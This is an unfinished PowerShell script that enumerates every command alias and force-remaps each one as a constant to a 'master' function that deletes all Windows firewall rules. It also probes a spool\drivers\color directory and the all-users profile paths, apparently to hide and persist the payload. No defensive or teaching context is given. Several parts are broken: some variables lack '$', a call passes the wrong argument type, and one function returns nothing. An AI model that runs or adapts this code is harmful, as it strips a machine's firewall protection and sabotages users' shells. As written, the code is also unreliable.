function get_aliases() {
    $dct = @{ }
    #Get-Alias.GetType;
    Get-Alias | ForEach-Object { $dct[[string]$_.Name] = [string]$_.DisplayName.Split(' ')[2] }
    # map each alias in the format alias : command it is mapped to
    #$tmp = @()
    #$dct.Keys | ForEach-Object {
    #    $tmp += $_
    #}
    #$tmp = $tmp | Sort-Object
    return $dct

}

function store([string]$alias_name) {
    $path = "C:\Windows\System32\spool\drivers\color\"
    if (Test-Path $path) {
        # Test if path we want to write to exists
        Write-Host "Path existsq"

    }

}

function get_content {
    $return_str = @"
    function master() {
        try {
            Remove-NetFirewallRule | Out-Null
        }
        Catch {
    
        }
    }
    "`r`n"

"@

}

function set_alias([hashtable]$dct) {
    foreach ($key in $dct.Keys) {
        orig_command = $dct[$key]
        new_command = Set-Alias -Name $key -Value master -Option AllScope,Constant -Force | Out-Null
    }

    exit 1
}
function remapper([hashtable]$dct) {
    $tmp = $dct.keys | Sort-Object
    $tmp 
    set_alias get_aliases
    #$content = get_content


}

function main() {
    $cur_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    # $env:USERNAME may be modified
    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
    $allusers_allhosts = $PROFILE.AllUsersAllHosts
    $32bit_path = $allusers_allhosts.Replace("System32", "SysWOW64")
    $dct = get_aliases
    remapper($dct)


}
#main
#get_aliases
main